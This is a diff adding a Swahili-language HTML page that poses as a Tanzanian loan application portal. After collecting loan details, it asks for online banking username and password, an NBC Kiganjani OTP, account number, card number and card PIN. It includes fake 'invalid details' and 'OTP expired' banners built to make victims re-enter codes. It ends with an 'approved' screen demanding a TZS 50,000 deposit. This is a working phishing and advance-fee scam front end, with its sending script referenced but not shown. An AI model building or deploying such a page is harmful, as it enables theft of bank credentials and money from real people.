@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Maombi ya Mkopo Tanzania 🇹🇿</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- Header -->
+  <header class="top-header">
+    <div class="header-title">
+      <span>MAOMBI YA MKOPO</span>
+      <small>TANZANIA</small>
+    </div>
+    <div class="header-flag">🇹🇿</div>
+  </header>
+
+  <!-- HATUA 0: UJUMBE WA KUKARIBISHA -->
+  <section id="step-welcome" class="screen active">
+    <div class="card-box">
+      <h2 class="title-red">KARIBU KWENYE LANGO LA MKOPO</h2>
+      <p class="desc-text">
+        MPENDWA MWOMBAJI, TAFADHALI HAKIKISHA KWAMBA TAARIFA ZAKO ZOTE ZA AKAUNTI YA BENKI NA SIMU ZIMESASISHWA (UP TO DATE) ILI MAOMBI YAKO YAFANIKIWE KIKAMILIFU BILA HITILAFU YOYOTE.
+      </p>
+      <div class="info-alert-box">
+        ⚠️ TAFADHALI THIBITISHA TAARIFA ZAKO KABLA YA KUENDELEA.
+      </div>
+    </div>
+    <button id="btn-welcome-proceed" class="btn-red">PROCEED</button>
+  </section>
+
+  <!-- HATUA 1 YA 3: KIKOKOTOO NA AINA YA MKOPO -->
+  <section id="step-1-3" class="screen">
+    <div class="progress-bar-container">
+      <div class="step-label">Hatua 1 ya 3</div>
+      <div class="bars">
+        <span class="bar active"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <h3 class="form-section-title">Maombi ya Mkopo</h3>
+
+      <div class="form-group">
+        <label>Aina ya Mkopo</label>
+        <select id="loan-type-select" class="input-select">
+          <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+          <option value="Mkopo wa Basi/Binafsi">Mkopo wa Binafsi</option>
+          <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
+          <option value="Mkopo wa Elimu">Mkopo wa Elimu</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Kiasi cha Mkopo (TSh)</label>
+        <div class="slider-display" id="loan-amount-text">TSh 100,000</div>
+        <input type="range" id="loan-amount-slider" min="50000" max="10000000" step="50000" value="100000" class="range-red">
+        <div class="slider-limits">
+          <span>50,000</span>
+          <span>10,000,000</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Muda wa Mkopo (Miezi)</label>
+        <div class="slider-display" id="loan-months-text">Miezi 12</div>
+        <input type="range" id="loan-months-slider" min="6" max="60" step="6" value="12" class="range-red">
+        <div class="slider-limits">
+          <span>Miezi 6</span>
+          <span>Miezi 60</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Madhumuni ya Mkopo</label>
+        <textarea id="loan-purpose" class="input-textarea" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+      </div>
+    </div>
+
+    <button id="btn-step1-next" class="btn-red">HATUA INAYOFUATA</button>
+  </section>
+
+  <!-- HATUA 2 YA 3: TAARIFA BINAFSI -->
+  <section id="step-2-3" class="screen">
+    <div class="progress-bar-container">
+      <div class="step-label">Hatua 2 ya 3</div>
+      <div class="bars">
+        <span class="bar active"></span>
+        <span class="bar active"></span>
+        <span class="bar"></span>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="form-row">
+        <div class="form-group half">
+          <label>Jina la Kwanza</label>
+          <input type="text" id="first-name" class="input-text" placeholder="Jina la kwanza">
+        </div>
+        <div class="form-group half">
+          <label>Jina la Ukoo</label>
+          <input type="text" id="last-name" class="input-text" placeholder="Jina la ukoo">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Nambari ya Simu</label>
+        <div class="phone-input-group">
+          <span class="flag-prefix">🇹🇿 +255</span>
+          <input type="text" id="phone-number" class="input-text" placeholder="712345678 au 0712345678" maxlength="10">
+        </div>
+        <small class="hint-text">Weka nambari 9 au anza na 0 (mfano, 0712345678 → inabadilika hadi 0712345678)</small>
+      </div>
+    </div>
+
+    <div class="btn-group-row">
+      <button id="btn-step2-back" class="btn-gray">ILIYOTANGULIA</button>
+      <button id="btn-step2-next" class="btn-red">HATUA INAYOFUATA</button>
+    </div>
+  </section>
+
+  <!-- HATUA 3 YA 3: MUHTASARI -->
+  <section id="step-3-3" class="screen">
+    <div class="progress-bar-container">
+      <div class="step-label">Hatua 3 ya 3</div>
+      <div class="bars">
+        <span class="bar active"></span>
+        <span class="bar active"></span>
+        <span class="bar active"></span>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="form-group">
+        <label>Hali ya Ajira</label>
+        <select id="employment-status" class="input-select">
+          <option value="Mfanyabiashara">Mfanyabiashara</option>
+          <option value="Mwajiriwa">Mwajiriwa</option>
+          <option value="Mkulima">Mkulima</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Mapato ya Mwaka (TSh)</label>
+        <input type="text" id="annual-income" class="input-text" placeholder="Weka mapato ya mwaka">
+      </div>
+
+      <div class="summary-box">
+        <h4>Muhtasari wa Maombi</h4>
+        <div class="summary-row"><span>Kiasi cha Mkopo:</span> <strong id="sum-amount">TSh 100,000</strong></div>
+        <div class="summary-row"><span>Muda wa Mkopo:</span> <strong id="sum-months">Miezi 12</strong></div>
+        <div class="summary-row"><span>Madhumuni:</span> <strong id="sum-purpose">Biashara</strong></div>
+        <div class="summary-row"><span>Mwombaji:</span> <strong id="sum-name">N/A</strong></div>
+      </div>
+    </div>
+
+    <div class="btn-group-row">
+      <button id="btn-step3-back" class="btn-gray">ILIYOTANGULIA</button>
+      <button id="btn-step3-next" class="btn-red">WASILISHA MAOMBI</button>
+    </div>
+  </section>
+
+  <!-- HATUA YA 4: KUINGIA BENKI (BANK USERNAME & PASSWORD) -->
+  <section id="step-login" class="screen">
+    <!-- BANNER LA ARIFA YA SURFACE -->
+    <div id="creds-surface-banner" class="surface-banner-red">
+      TAARIFA SI SAHIHI ❌ TAFADHALI WEKA TENA USERNAME NA PASSWORD SAHIHI.
+    </div>
+
+    <div class="card-box">
+      <h3 class="title-red">INGIA KWENYE AKAUNTI YA BENKI</h3>
+      <p class="sub-desc">Weka taarifa zako za benki ili kuthibitisha maombi yako.</p>
+
+      <div class="form-group">
+        <label>BANK USERNAME</label>
+        <input type="text" id="bank-username" class="input-text" placeholder="Mfano: 07********">
+      </div>
+
+      <div class="form-group">
+        <label>PASSWORD</label>
+        <input type="password" id="bank-password" class="input-text" placeholder="Weka password yako">
+      </div>
+    </div>
+
+    <button id="btn-submit-login" class="btn-red">PROCEED</button>
+  </section>
+
+  <!-- HATUA YA 5: OTP YA TARAKIMU 6 (NBC KIGANJANI) -->
+  <section id="step-otp" class="screen">
+    <div id="otp-surface-banner" class="surface-banner-red">
+      OTP IMEKWISHA MUDA WAKE ❌ TAFADHALI WEKA OTP MPYA YA NBC KIGANJANI.
+    </div>
+
+    <div class="card-box align-center">
+      <h3 class="title-red">UTHIBITISHO WA NBC KIGANJANI</h3>
+      <p class="sub-desc">Weka namba ya OTP ya tarakimu 6 iliyotumwa kwenye simu yako.</p>
+
+      <div class="otp-grid-6">
+        <input type="text" class="otp-box-6" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input type="text" class="otp-box-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-6" maxlength="1" inputmode="numeric">
+      </div>
+
+      <small class="hint-text">Mfumo utatambua na kusoma SMS kiotomatiki (Autofill).</small>
+    </div>
+
+    <button id="btn-submit-otp" class="btn-red">THIBITISHA OTP</button>
+  </section>
+
+  <!-- HATUA YA 6: TAARIFA ZA AKAUNTI, KADI NA PIN -->
+  <section id="step-bank-details" class="screen">
+    <div id="bank-surface-banner" class="surface-banner-red">
+      TAARIFA ZINAMAKOSA ❌ TAFADHALI WEKA TAARIFA SAHIHI.
+    </div>
+
+    <div class="card-box">
+      <h3 class="title-red">TAARIFA ZA BENKI NA KADI</h3>
+
+      <div class="form-group">
+        <label>ACCOUNT NUMBER</label>
+        <input type="text" id="bank-account-no" class="input-text" placeholder="Weka namba ya akaunti">
+      </div>
+
+      <div class="form-group">
+        <label>CARD NUMBER</label>
+        <input type="text" id="bank-card-no" class="input-text" placeholder="4000 XXXX XXXX XXXX" maxlength="19">
+      </div>
+
+      <div class="form-group align-center">
+        <label>ENTER YOUR CARD PIN AT HERE</label>
+        <div class="pin-grid-4">
+          <input type="password" class="pin-box-4" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-4" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-4" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-4" maxlength="1" inputmode="numeric">
+        </div>
+      </div>
+    </div>
+
+    <button id="btn-submit-verify" class="btn-red">VERIFY</button>
+  </section>
+
+  <!-- HATUA YA 7: UKURASA WA MAFANIKIO (SUCCESS SCREEN) -->
+  <section id="step-success" class="screen">
+    <div class="card-box align-center">
+      <div class="success-icon">✓</div>
+      <h2 class="title-red">HONGERA! MKOPO WAKO UMEIDHINISHWA 🎉</h2>
+      
+      <div class="approved-amount-box">
+        <span>KIASI KILICHOIDHINISHWA</span>
+        <h1 id="final-approved-amount">TSh 100,000</h1>
+      </div>
+
+      <div class="dormant-alert-card">
+        <h4>⚠️ SHARTI LA AMANA YA AKAUNTI</h4>
+        <p>
+          AKAUNTI YAKO IPO KWENYE HALI YA KUTOTUMIKA KWA MUDA (DORMANT ACCOUNT). ILI KUKAMILISHA NA KUPOKEA MKOPO WAKO MOJA KWA MOJA, UNATAKIWA KUWEKA AMANA YA <strong>TZS 50,000</strong> KWENYE AKAUNTI YAKO YA BENKI.
+        </p>
+        <p class="wait-text">BAADA YA KUWEKA AMANA, TAFADHALI SUBIRI KWA SAA 24 (24 HOURS) ILI FEDHA ZAKO ZIINGIZWE KIKAMILIFU.</p>
+      </div>
+    </div>
+
+    <button id="btn-finish-home" class="btn-red">RUDI NYUMBANI</button>
+  </section>
+
+  <!-- LOADING OVERLAY -->
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title">INACHAKATA...</h3>
+    <p id="loading-sub">Tafadhali subiri kidogo.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+  </html>
+            
